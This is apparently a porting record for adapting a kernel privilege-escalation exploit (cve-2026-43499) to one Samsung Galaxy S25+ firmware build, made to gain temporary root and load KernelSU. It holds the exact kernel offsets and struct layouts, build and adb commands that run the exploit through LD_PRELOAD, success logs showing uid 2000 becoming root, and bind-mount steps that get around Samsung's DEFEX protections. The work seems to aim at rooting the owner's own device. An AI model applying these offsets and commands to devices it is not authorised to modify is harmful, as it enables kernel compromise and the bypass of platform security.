# SM-S9360 / S9360ZHSCCZG1 porting record

Device-tested temporary root + KernelSU (LKM jailbreak mode) on 2026-09-08.
Locked bootloader; no persistent boot.img modification. Re-establish per boot.

## 1. Firmware identity

| field | value |
| --- | --- |
| model | `SM-S9360` (Galaxy S25+, Greater China / Hong Kong `TGY`+`OZS`) |
| AP/PDA | `S9360ZHSCCZG1` |
| CSC | `S9360OZSCCZG1` (`OZS`, Hong Kong open) |
| codename | `pa2q` |
| build fingerprint | `samsung/pa2qzhx/pa2q:16/BP4A.251205.006/S9360ZHSCCZG1_OZSCCZG1:user/release-keys` |
| kernel release | `6.6.98-android15-8-pd6ff1cd-abogkiS9360ZHSCCZG1-4k` |
| kernel SHA-256 | `04357fcc1799bae815b9753ad846350b250ec5e0b4b76b961f62e830edd15877` (raw Image from boot.img) |
| boot.img SHA-256 | `3F27976AA2B078716076CF026D70F3A6F550EAB10E896A813B26A0C9D36FD9F2` |

Extraction values:

```text
boot.img size: 101122048 (header v4, page 4096)
kernel size:   38849024 (0x250F000), copied from boot offset 0x1000
ARM64 Image text_offset: 0x0
ARM64 Image image_size:  0x27B0000
ARM64 Image flags:       0xa
raw BTF interval:        [0x18748D4, 0x1E8BB88) (6386356 bytes)
vmlinux-to-elf base:     0xffffffc080000000 (114227 kallsyms symbols)
```

This device uses the `pd6ff1cd-abogki` GKI base, which is **not** the
`p5a696e2-abogki` base of the China `pa2q-S9360ZCSCCZG1` profile and **not**
the `pa3q` base of the S25 Ultra. The shared `galaxy-s25-series` payload
(built from `pa3q-S938NKSUACZF1`) is close but not exact: its P0 fingerprint
table has 1 mismatching row (see §5), so it must not be used on this build.

## 2. Why a separate profile

`S9360ZHSCCZG1` and `S9360ZCSCCZG1` share the model `SM-S9360` and the
three-part kernel version `6.6.98`, so the Root My Galaxy feed cannot
distinguish them by `models` + `kernelVersions` alone. The two builds have
different kernel-data offsets:

| macro | `pa2q` ZCS (`p5a696e2`) | this build (`pd6ff1cd`) |
| --- | ---: | ---: |
| `KMALLOC_CACHES_OFF` | `0x017dac30` | `0x017da710` |
| `SLIDE_NFULNL_LOGGER_NAME_OFF` | `0x0175e75d` | `0x0175e266` |

Running the ZCS payload on this build reproduces the documented cache-gate
failure class (`pipe caches ... selected=...` never matching the real slab
cache). The app history on this device (`2026-08-29`, profile
`pa2q-S9360ZCSCCZG1`, `usedShizuku=false`) stopped at
`fresh physrw pipe page=...` and ended in `安装失败`.

Every other offset is identical to `pa3q-S938NKSUACZF1`; only
`SLIDE_NFULNL_LOGGER_NAME_OFF` differs from it by `-0x3b`.

## 3. Offsets

All offsets were re-derived from this kernel's recovered `vmlinux.elf` and
BTF, then compared against both existing S25 profiles. Identical to `pa3q`
unless noted.

```text
KIMAGE_TEXT_BASE            0xffffffc080000000
P0_PHYS_OFFSET              0x80000000
P0_KERNEL_PHYS_LOAD         0xa8000000
KMALLOC_CACHES_OFF          0x017da710
ANON_PIPE_BUF_OPS_OFF       0x0124cdc8
ASHMEM_FOPS_OFF             0x0140b440
ASHMEM_MISC_FOPS_OFF        0x0247d7f0
INIT_TASK_OFF               0x0230e4c0
ROOT_TASK_GROUP_OFF         0x0251cd80
SELINUX_ENFORCING_OFF       0x0255f5c0   (selinux_state.enforcing == offset 0)
SYSTEM_UNBOUND_WQ_OFF       0x022fae60
SLIDE_NFULNL_LOGGER_NAME_OFF    0x0175e266   <-- build-specific
SLIDE_NFULNL_LOGGER_OBJECT_OFF  0x02302278
SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF 0x02439490
SLIDE_SYSCTL_BOOTID_OFF         0x026426d8
SLIDE_TRACEFS_WORKER_CALLER_OFF 0x000d97ec
COPY_SPLICE_READ_OFF            0x00416970   (symbol: copy_splice_read)
CALL_USERMODEHELPER_EXEC_WORK_OFF 0x000d0eac
CONFIGFS_READ_ITER_OFF          0x004954b8
CONFIGFS_BIN_WRITE_ITER_OFF     0x004959e4
NOOP_LLSEEK_OFF                 0x003c9450
ASHMEM_IOCTL_OFF                0x00d70dfc
ASHMEM_COMPAT_IOCTL_OFF         0x00d714b8
ASHMEM_MMAP_OFF                 0x00d7150c
ASHMEM_OPEN_OFF                 0x00d7172c
ASHMEM_RELEASE_OFF              0x00d717b4
ASHMEM_SHOW_FDINFO_OFF          0x00d71840
```

BTF layout values (from this kernel's raw BTF) match `pa3q`/`pa2q` exactly:

```text
sizeof(file_operations) = 0x108
file_operations.unlocked_ioctl = 0x48, compat_ioctl = 0x50, mmap = 0x58
file_operations.open = 0x68, release = 0x78, splice_read = 0xb8,
file_operations.show_fdinfo = 0xd8

task_struct.usage = 0x40, prio = 0x84, normal_prio = 0x8c
task_struct.sched_task_group = 0x348
task_struct.pi_lock = 0x90c, pi_waiters = 0x920
task_struct.pi_top_task = 0x930, pi_blocked_on = 0x938

sizeof(page) = 0x40, compound_head = 0x08, page_type = 0x30
sizeof(slab) = 0x40, slab.slab_cache = 0x08

rt_waiter_node = { rb_node entry @0x00, prio @0x18, deadline @0x20 } (size 0x28)
rt_mutex_waiter = { tree @0x00, pi_tree @0x28, task @0x50,
                    lock @0x58, wake_state @0x60, ww_ctx @0x68 } (size 0x70)

configfs_buffer.page = 0x10, needs_read_fill = 0x50, bin_buffer = 0x58,
configfs_buffer.bin_buffer_size = 0x60, cb_max_size = 0x64
work_struct = { data @0x00, entry @0x08, func @0x18 }
pool_workqueue = { pool @0x00, wq @0x08, work_color @0x10, refcnt @0x18,
                   nr_in_flight @0x1c, nr_active @0x5c, max_active @0x60 }
worker_pool = { worklist @0x28, nr_idle @0x3c }
workqueue_struct.dfl_pwq = 0xb0
miscdevice.fops = 0x10
```

Slide defaults are unchanged from the shared S25 payload:
`SLIDE_TRACEFS_EVENT_ID = 109` (`__TRACE_LAST_TYPE` 20 +
`__event_sched_blocked_reason` index 89), `SLIDE_PSELECT_WORD_SHIFT = 0`,
`SLIDE_STACK_WRITER` default (no override).

## 4. Physical load address

```c
#define P0_PHYS_OFFSET       0x80000000ULL
#define P0_KERNEL_PHYS_LOAD  0xa8000000ULL
```

Same Qualcomm/`gunyah_hyp_region` derivation as `pa2q`/`psq`; the
`0xa8000000` literal is also present in this firmware's `xbl_config.elf`.
The hardware run below reached the pipe cache gate with this value, which
confirms the direct-map address math for this build.

## 5. p0 fingerprint

Regenerated from this kernel's raw Image with
`tools/generate_p0_fingerprint.pl kernel 0x1f0000 ...` (`PROBE_OFFSET=0x1f0000`).
It differs from the `pa3q` table in **1 of 32 rows** (slide `0x0c0000`) and
from the `pa2q` table in 12 of 32 rows, so the shared table cannot be reused.

## 6. KernelSU

The published `kernelsu/ksud-s25u-kdp` (`android15-6.6` KMI) loads on this
build without modification. The Samsung DEFEX Safeplace blocks executing
`ksud` directly from `/data/local/tmp/`, so the late-load path bind-mounts the
loader over `/system/bin/logcat` inside a private mount namespace.

**Repository mismatch and local fix:** upstream `src/su_daemon.c` passes
`late-load --ephemeral`, but the published `ksud-s25u-kdp` (v3.2.5, 32525)
rejects it (`error: unexpected argument '--ephemeral' found`). This port drops
the flag in `src/su_daemon.c`; the Samsung-patched ksud instead stages its
daemon from `/data/local/tmp/.ksud-stage` and finishes the install itself,
which is exactly what the app's bundled `ksu-helper` already does. With that
change `cve-2026-43499-root --late-load` succeeds and keeps its bind mount
inside the private mount namespace created by the helper's C code.

If the helper is built from unmodified upstream source, `--late-load` fails
and a shell fallback is needed:

```sh
adb shell "/data/local/tmp/cve-2026-43499-root -c \
  'unshare -m /system/bin/sh -c \"mount -o bind \
   /data/local/tmp/ksud-s25u-kdp /system/bin/logcat && \
   /system/bin/logcat late-load --package-name me.weishu.kernelsu\"'"
```

That fallback is not namespace-safe on this firmware: toybox `unshare` has no
`--make-rprivate`, so the bind mount propagates into the global namespace and
replaces `/system/bin/logcat` with ksud until it is unmounted. `tools/reroot.sh`
detects and removes the leaked mount after the fallback.

The loader file must be executable (`chmod 755`) and
`/data/local/tmp/.ksud-stage` must contain a copy of `ksud-s25u-kdp` before
every late-load (the loader consumes/renames it).

### Post-late-load framework restart (expected)

On this device the KernelSU late-load restarts `zygote64`/`system_server`
(the installed Zygisk modules need a zygote restart to inject). The screen
shows the boot animation again, which looks like a reboot, but the kernel is
not rebooted: `/proc/stat` `btime` and `/proc/uptime` continue, `kernelsu`
stays in `/proc/modules`, and KernelSU Manager reports root once the framework
is back. The first zygote spawn can also fail transiently
(`CANNOT LINK EXECUTABLE "/system/bin/app_process": library
"libnativeloader.so" not found`) while module mounts are being applied; init
retries and the framework comes up normally. This is not a kernel panic and
does not clear the KernelSU module.

### Module-induced cold reboot during late-load

Because KernelSU is late-loaded per boot, `/data/adb/modules` is mounted for
the first time inside the late-load, i.e. at the same moment zygote is
restarted. A module that wedges that restart (a Zygisk module whose `zygisk/`
payload crashes `app_process`, or a `system/` overlay of
`system/etc/security/cacerts` that breaks the loader) turns the expected warm
framework restart into a hang that init/Samsung escalation resolves with a
**cold** reset: `kernelsu` is unloaded, the per-boot root is gone, and the
module itself is untouched in `/data/adb` -- so the loop repeats on every
attempt with no window to remove it from inside the app.

The escape is to never late-load KernelSU while the offending module is still
installed:

```sh
tools/reroot.sh --no-ksu          # bootstrap root only: modules are not
                                  # loaded, so the device does not freeze
tools/module-rescue.sh list       # inspect /data/adb/modules (+ ksu configs,
                                  # post-fs-data.d, service.d)
tools/module-rescue.sh purge cert # back up to /data/local/tmp + artifacts/,
                                  # then delete the matching module dirs
tools/module-rescue.sh load-ksu   # late-load KernelSU again
```

`tools/module-rescue.sh` drives `tools/device/rmg-module-tool.sh` through the
bootstrap root daemon that `reroot.sh --no-ksu` leaves at
`/data/local/tmp/temp_su.sock`; `disable <pattern>` and `disable-all` are the
non-destructive variants. `load-ksu` prints the `boot_id` before and after the
late-load: an unchanged `boot_id` proves the framework restart happened without
a cold reset. The device is never bricked by this class of failure -- a cold
boot loads no KernelSU at all, so every boot starts from a clean `/data/adb`.

### The bootstrap root cannot see `/data/adb`

The exploit's root daemon runs as `u:r:kernel:s0` and has no KernelSU DEFEX/KDP
credential sync (the kernel module strings say `Samsung DEFEX credential
synchronization and KSU-task bypass enabled` / `Samsung KDP task-scoped
credential and direct PGD path enabled`). Even with `enforce=0` and `uid=0`,
`samsung/pa2q` answers `ls: /data/adb/modules: Operation not permitted` for
that context, while `stat` on a known path still succeeds. Reading or purging
modules therefore **must** happen in KernelSU's own domain (`u:r:ksu:s0`),
which is what `ksud`/the Manager use.

Two ways out, without ever letting the app mount modules again:

1. `tools/module-rescue.sh driver` -- loads the KernelSU kernel module and
   nothing else:

   ```text
   unshare -m /system/bin/sh -c "mount -o bind /data/local/tmp/ksud-s25u-kdp \
     /system/bin/logcat && /system/bin/logcat insmod \
     /data/local/tmp/kernelsu-s25u-kdp.ko allow_shell=1"
   ```

   No `post-fs-data` stage runs, so no module is mounted and no zygote restart
   is triggered; `allow_shell=1` makes `su` work for the shell. The helper's
   `unshare` cannot make the tree rprivate, so the logcat bind mount is
   detected and removed again, and `driver-unload` (`ksud unload`) undoes the
   load. Once `su` answers, every module action of `module-rescue.sh`
   automatically switches to the `su` transport and `/data/adb` is readable.

2. Safe-mode late-load: the kernel module counts `KEY_VOLUMEDOWN` events
   (`check_safemode`, `KEY_VOLUMEDOWN pressed max times, safe mode detected!`;
   its only parameters are `allow_shell` and `norc`), and ksud then prints
   `safe mode, skip post-fs-data scripts and disable all modules!` -- every
   module gets a `disable` marker, so the offending module is never mounted and
   the framework restart survives. Tap Volume Down 3-5 times right after
   `load-ksu` starts.

### Recovering from a bad module (hardware-verified 2026-09-10)

The failure this was written for: `CA-Installer` (a `system/` overlay of
`system/etc/security/cacerts` plus a `post-fs-data.sh`, mounted through the
`mountify` metamodule) turned the expected warm framework restart of the
late-load into a cold reset, so the per-boot root was gone before anything
could be removed, and `/data/adb` was unreadable from the bootstrap root.

Two hard facts make the rescue work:

* the bootstrap root (`u:r:kernel:s0`) gets `EPERM` on **readdir** of
  `/data/adb/modules` (DEFEX), while `mount`, `stat` and `ksud`-driven access
  in `u:r:ksu:s0` are fine -- so never enumerate modules from the bootstrap
  context;
* loading `kernelsu.ko` immediately restores SELinux enforcing and the daemon
  socket becomes unreachable, so anything that must run after the load has to
  happen inside the same request (or through `su`).

Ladder, cheapest first:

| situation | action |
| --- | --- |
| before installing anything | `tools/module-rescue.sh snapshot` (full module + ksu config backup) |
| KSU loaded and `su` answers | `tools/module-rescue.sh list` -> `disable <id>` / `purge <id>` (transport auto-switches to `su`) |
| KSU **not** loaded, suspect module installed | `tools/reroot.sh --no-ksu` then `tools/module-rescue.sh --shadow-modules load-ksu`: empty dirs are bind-mounted over `/data/adb/modules(_update)`, ksud's post-fs-data sees no modules, the framework restart survives, `su` comes up; then `su -c 'umount /data/adb/modules'` (the script does it) and purge normally |
| only the bootstrap daemon, `/data/adb` unreadable | `tools/module-rescue.sh chain` / `driver` (bind-spoofed `.ko` path) or the volume-key safe mode above |

The shadow trick works because `mount -o bind <empty> /data/adb/modules` succeeds
even though listing the same directory does not: DEFEX blocks the enumeration,
not the mount. The verified end state after removal: full `reroot.sh` reaches
`su` in `u:r:ksu:s0` with an unchanged `boot_id` (no cold reset) and
`/system/etc/security/cacerts` back to the stock 143 entries.

## 7. Device validation (2026-09-08)

Build:

```sh
make all TARGET=pa2q-S9360ZHSCCZG1 ANDROID_NDK_HOME=<ndk-r28c>
```

Outputs:

| file | size |
| --- | ---: |
| `build/pa2q-S9360ZHSCCZG1/cve-2026-43499-app.so` | 126624 |
| `build/pa2q-S9360ZHSCCZG1/cve-2026-43499-root` | 26896 |
| `build/pa2q-S9360ZHSCCZG1/cve-2026-43499` | 105872 |

### Exploit (ADB shell domain, LD_PRELOAD)

```sh
adb push build/pa2q-S9360ZHSCCZG1/cve-2026-43499-app.so /data/local/tmp/
adb push build/pa2q-S9360ZHSCCZG1/cve-2026-43499-root /data/local/tmp/
adb shell "CVE43499_ROOT_HELPER=/data/local/tmp/cve-2026-43499-root \
  EXPLOIT_ATTEMPTS=8 \
  LD_PRELOAD=/data/local/tmp/cve-2026-43499-app.so /system/bin/id"
```

Succeeded on attempt 1/8 (uptime 45 h, quiet window satisfied). Decisive log:

```text
[+] p0 physical elapsed_ms=4514
[+] slide-kaslr-ok source=physical base=ffffffc0800d0000 slide=00000000000d0000
[*] pipe caches normal1k=ffffff8001cf4b00 normal2k=ffffff8001cf4c00 \
    cgroup1k=ffffff8001cf4b00 cgroup2k=ffffff8001cf4c00 selected=ffffff8001cf4c00
[*] pipe page idx=0 ... cache08=ffffff8001cf4c00 ... match=1
[*] phys step pipe probe found=1 ... scan=1/1/1
[*] root umh result wake=1 complete=1 retval=0 socket=1
[+] pipe physrw pid=20879 done=1 root=1 kaslr=1 read_ok=1 write_ok=1 \
    rw64=1/1 uid=2000->0
[+] exploit completed attempt=1/8
```

Temporary root:

```sh
$ adb shell "/data/local/tmp/cve-2026-43499-root -c id"
uid=0(root) gid=0(root) groups=0(root) context=u:r:kernel:s0
```

The `normal1k`/`normal2k` cache pointers are real slab-cache addresses and the
pipe page matched on the first probe, which validates `KMALLOC_CACHES_OFF`,
`ANON_PIPE_BUF_OPS_OFF` and the regenerated p0 table for this build.

### KernelSU

```text
KernelSU active: version=32525 flags=0x5 uapi=5 features=0x2
$ adb shell 'su -c id'
uid=0(root) gid=0(root) groups=0(root) context=u:r:ksu:s0
```

KernelSU Manager `v3.2.5 (32525-2)` reports `工作中 <LKM> [越狱模式]` with the
kernel release and fingerprint of this build.

### Integrity

```text
ro.boot.warranty_bit = 0
ro.boot.flash.locked = 1
ro.boot.verifiedbootstate = green
ro.boot.vbmeta.device_state = locked
```

No boot image modification; both root and KernelSU are per-boot.

## 8. One-click re-root (`tools/reroot.sh`)

The temporary root and KernelSU are per-boot. `tools/reroot.sh` re-establishes
both over adb using the same shell-domain path as the app's Shizuku mode:

```sh
cd Root-My-Galaxy-Payloads
tools/reroot.sh                       # default target pa2q-S9360ZHSCCZG1
tools/reroot.sh --attempts 16         # more exploit attempts
tools/reroot.sh --no-ksu              # temporary root only
tools/reroot.sh --serial <SERIAL>     # pick a device
tools/reroot.sh --dry-run             # print the exact commands
```

What it does:

1. waits for `sys.boot_completed`, reads model / kernel / fingerprint and
   refuses to run unless they match the target `BUILD_FINGERPRINT`
   (`--force` overrides);
2. pushes `cve-2026-43499-app.so`, `cve-2026-43499-root` and `ksud-s25u-kdp`
   to `/data/local/tmp` and `chmod 755`s them;
3. runs the exploit as shell (uid 2000, `u:r:shell:s0`, Seccomp=0) via
   `LD_PRELOAD` + `CVE43499_ROOT_HELPER`, honouring `EXPLOIT_ATTEMPTS`
   (default 8);
4. polls the root daemon until `-c id` reports `uid=0`;
5. stages `/data/local/tmp/.ksud-stage`, then tries the helper's
   `--late-load` and falls back to the bind-mount late-load when the shipped
   ksud rejects `--ephemeral`;
6. waits for adbd to come back and verifies `kernelsu` in `/proc/modules`
   plus `su -c id`.

If the exploit batch fails the script exits with the log path; the documented
recovery is a reboot and another run (probabilistic futex/fops races).

Verified end-to-end after real reboots on 2026-09-08. The clean run uses the
helper's own `--late-load` (log:
`artifacts/pa2q-S9360ZHSCCZG1/validation-2026-09-08-reroot-clean.log`):

```text
[*] waiting for boot allocator quiet window seconds=96 uptime=24
[+] exploit attempt=1/8 ... p0_offset=scan
[+] pipe physrw ... done=1 root=1 kaslr=1 read_ok=1 write_ok=1 rw64=1/1 uid=2000->0
[+] exploit completed attempt=1/8
    uid=0(root) ... context=u:r:kernel:s0
    staged /data/local/tmp/.ksud-stage
    late-load via helper succeeded
    KernelSU module loaded
    uid=0(root) ... context=u:r:ksu:s0
```

The earlier run (log: `validation-2026-09-08-reroot-reboot.log`) exercised the
shell fallback and left `/system/bin/logcat` bind-mounted globally; that leak
is now detected and cleaned by the script, and the rebuilt helper no longer
needs the fallback.

`tools/module-rescue.sh` (see "Module-induced cold reboot during late-load"
above) reuses the same transport to inspect, back up, disable or delete
KernelSU modules while KernelSU itself is *not* loaded.

## 9. Scope

Verified only for `SM-S9360` / `S9360ZHSCCZG1` (`OZS`, `pd6ff1cd-abogki`
GKI). `targets-v3.json` lists both `pa2q` regional builds. Both match
`SM-S9360` + `6.6.98`, so automatic selection needs a tie-breaker: the two
entries also carry their exact kernel release
(`6.6.98-android15-8-pd6ff1cd-abogkiS9360ZHSCCZG1-4k` vs
`6.6.98-android15-8-p5a696e2-abogkiS9360ZCSCCZG1-4k`), and the companion app
change prefers an exact full-release match before falling back to the legacy
three-part match. Clients without that change still resolve to the first
matching entry (`pa2q-S9360ZCSCCZG1`), so ZHS devices must pick
`pa2q-S9360ZHSCCZG1` manually in advanced mode, or be served a filtered feed
(see the mock-distribution section of the porting guide). Do not use the ZCS
payload on a ZHS build.
